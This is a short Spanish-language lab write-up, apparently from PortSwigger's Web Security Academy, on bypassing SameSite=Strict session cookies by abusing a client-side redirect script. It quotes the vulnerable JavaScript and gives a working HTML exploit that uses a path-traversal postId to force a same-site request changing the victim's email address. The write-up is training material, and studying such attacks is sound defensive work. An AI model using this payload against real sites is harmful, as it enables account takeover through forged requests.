---
title: "08 - SameSite Strict bypass via client-side redirect"
---

# 08 - SameSite Strict bypass via client-side redirect

La cookie de sesión tiene SameSite Strict, por lo que no será enviada en ninguna petición que no sea entre el propio dominio.

```
/resources/js/commentConfirmationRedirect.js
```

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

Vaya, que al acceder a 
```
https://0a6100ba04b3924186fad99b007500d3.web-security-academy.net/post/comment/confirmation?postId=99
```

Te redirige a 

```
https://0a6100ba04b3924186fad99b007500d3.web-security-academy.net/post/99
```


Exploit :

```html
<script>
window.location='https://0a6100ba04b3924186fad99b007500d3.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail%3deeeaaaaaaa%2540test.com%26submit%3d1'
</script>
```
